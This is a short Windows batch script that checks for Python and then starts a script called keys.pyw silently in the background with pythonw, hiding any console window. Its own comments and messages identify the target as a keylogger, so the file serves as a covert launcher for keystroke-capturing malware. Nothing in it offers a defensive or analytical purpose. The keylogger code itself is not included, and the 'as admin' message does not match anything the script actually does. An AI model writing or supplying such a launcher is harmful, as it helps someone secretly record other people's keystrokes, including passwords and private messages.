@echo off
:: Check if Python is installed
python --version >nul 2>&1
IF %ERRORLEVEL% NEQ 0 (
    echo Python is not installed or not in the PATH. Please install Python first.
    exit /b
)

:: Check if the Python script (keylogger.py) exists in the current directory
IF NOT EXIST "keys.pyw" (
    echo Error: keys.pyw not found in the current directory.
    exit /b
)

:: Run the Python script in the background without opening any terminal window using pythonw.exe
echo Running the keylogger script as admin...
start "" /min pythonw keys.pyw
exit
